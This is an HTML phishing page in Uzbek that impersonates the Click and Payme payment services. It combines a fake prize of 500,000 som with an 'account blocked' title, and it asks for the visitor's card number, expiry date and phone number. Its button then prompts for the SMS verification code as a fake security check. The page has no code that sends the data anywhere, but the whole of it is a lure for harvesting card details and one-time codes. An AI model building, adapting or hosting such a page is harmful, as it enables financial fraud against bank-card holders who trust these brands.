<!DOCTYPE html>
<html lang="uz">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sizning hisobingiz bloklandi!</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #eef2f3;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
            border-top: 8px solid #00aef3;
        }

        .logo {
            font-size: 32px;
            font-weight: bold;
            color: #00aef3;
            margin-bottom: 10px;
        }

        h2 {
            color: #333;
            font-size: 18px;
            margin-bottom: 20px;
        }

        .input-group {
            text-align: left;
            margin-bottom: 15px;
        }

        label {
            display: block;
            margin-bottom: 5px;
            color: #666;
            font-size: 14px;
        }

        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
        }

        button {
            width: 100%;
            padding: 14px;
            background: #00aef3;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 10px;
        }

        button:hover {
            background: #008ec6;
        }

        .footer {
            margin-top: 25px;
            font-size: 12px;
            color: #999;
        }

        .promo {
            background: #fff9c4;
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 20px;
            color: #827717;
            font-weight: bold;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="logo">CLICK / PAYME</div>
        <div class="promo">🎁 TABRIKLAYMIZ! 500,000 SO'M YUTIB OLDINGIZ!</div>
        <h2>Bonusni olish uchun kartangizni tasdiqlang</h2>

        <div class="input-group">
            <label>Karta raqami</label>
            <input type="text" placeholder="8600 ....">
        </div>

        <div class="input-group">
            <label>Amal qilish muddati</label>
            <input type="text" placeholder="MM / YY">
        </div>

        <div class="input-group">
            <label>Telefon raqam</label>
            <input type="text" placeholder="+998 ..">
        </div>

        <button onclick="alert('Xavfsizlik tekshiruvi: SMS kodingizni kiriting')">SOVG'ANI OLISH</button>

        <p class="footer">© 2026 CLICK-PAYME Rasmiy Integratsiyasi</p>
    </div>
</body>

</html>
